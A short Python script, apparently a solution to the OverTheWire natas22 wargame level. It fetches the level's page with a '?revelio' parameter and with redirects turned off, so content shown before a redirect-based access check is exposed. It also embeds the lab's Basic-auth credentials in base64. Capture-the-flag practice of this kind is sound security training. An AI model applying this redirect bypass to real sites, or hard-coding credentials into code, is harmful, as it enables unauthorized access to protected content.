import requests

headers = {
    'Authorization': 'Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg=='
}

url = 'http://natas22.natas.labs.overthewire.org/?revelio'

request = requests.get(url=url, headers=headers, allow_redirects=False)

print(request.content.decode('utf-8'))
